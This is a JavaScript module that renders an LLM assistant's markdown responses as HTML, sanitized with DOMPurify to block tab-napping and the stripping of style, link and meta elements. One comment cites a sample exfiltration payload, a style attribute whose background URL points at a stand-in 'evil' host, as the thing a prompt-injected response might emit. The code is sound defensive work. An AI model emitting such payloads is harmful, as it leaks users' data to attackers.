import DOMPurify from 'dompurify';
import { marked } from 'marked';

marked.setOptions({
  gfm: true,
  breaks: true
});

// Force every <a target="_blank"> to carry rel="noopener noreferrer", even
// if the LLM tried to set rel="opener" or omitted rel entirely. Tab-napping
// attacks rely on the opener relationship — we close that off unconditionally.
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A' && node.getAttribute('target')) {
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

/** Render an assistant message as sanitized HTML. */
export function renderMarkdown(src) {
  if (!src) return '';
  const raw = marked.parse(src, { async: false });
  // FORBID_ATTR strips style attrs so a prompt-injected response can't
  // exfiltrate via `style="background:url(http://evil/...)"`. FORBID_TAGS
  // drops <style>, <link>, <meta> for the same class of attack. ADD_ATTR
  // still lets us preserve target on links (with rel rewritten in the hook
  // above), since markdown autolinks legitimately need it.
  return DOMPurify.sanitize(raw, {
    ADD_ATTR: ['target'],
    FORBID_ATTR: ['style'],
    FORBID_TAGS: ['style', 'link', 'meta']
  });
}
